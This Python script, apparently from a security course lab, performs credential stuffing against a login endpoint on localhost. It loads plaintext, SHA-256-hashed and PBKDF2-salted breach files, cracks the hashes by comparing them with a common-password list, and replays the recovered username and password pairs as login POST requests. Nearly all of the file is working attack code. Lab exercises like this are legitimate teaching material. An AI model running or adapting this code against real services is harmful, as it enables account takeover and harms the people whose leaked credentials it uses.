from csv import reader
from requests import post, codes
import hashlib

from brute import HASHED_BREACH_PATH, SALTED_BREACH_PATH

LOGIN_URL = "http://localhost:8080/login"

COMMON_PASSWORDS_PATH = 'common_passwords.txt'

PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"
HASHED_BREACH_PATH = "app/scripts/breaches/hashed_breach.csv"
SALTED_BREACH_PATH = "app/scripts/breaches/salted_breach.csv"

def load_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return list(r)

def attempt_login(username, password):
    response = post(LOGIN_URL,
                    data={
                        "username": username,
                        "password": password,
                        "login": "Login",
                    })
    return response.status_code == codes.ok

def load_common_passwords():
    with open(COMMON_PASSWORDS_PATH) as f:
        pws = list(reader(f))
    return pws

def credential_stuffing_attack(creds):
    ans = []
    for usern, passw in creds:
        if attempt_login(usern, passw) == True:
            ans.append((usern,passw))
    print(ans)
    return ans

def hashed_stuffing_attack(creds):
    common = load_common_passwords()
    lst = []
    passw = dict()
    finalcreds = dict()

    for pw in common:
        result = hashlib.sha256(pw[0].encode())
        lst.append(result.hexdigest())
        passw[result.hexdigest()] = pw[0]

    for u, p in creds:
        if p in lst:
            finalcreds[u] = passw[p]
    credential_stuffing_attack(finalcreds.items())

def salted_stuffing_attack(creds):
    common = load_common_passwords()
    passw = dict()

    for cred in creds:
        user = cred[0]
        salt_hash = cred[1]
        salt = cred[2]

        for pw in common:
            result = hashlib.pbkdf2_hmac('sha256', pw[0].encode('utf-8'), bytes.fromhex(salt), 100000).hex()
            if result == salt_hash:
                passw[user] = pw

    credential_stuffing_attack(passw.items())
    

def main():
    creds = load_breach(PLAINTEXT_BREACH_PATH)
    hashed_creds = load_breach(HASHED_BREACH_PATH)
    salted_creds = load_breach(SALTED_BREACH_PATH)

    print("Credential Stuffing Attack:")
    credential_stuffing_attack(creds)

    print("Hashed Credential Stuffing Attack:")
    hashed_stuffing_attack(hashed_creds)

    print("Salted Credential Stuffing Attack:")
    salted_stuffing_attack(salted_creds)


if __name__ == "__main__":
    main()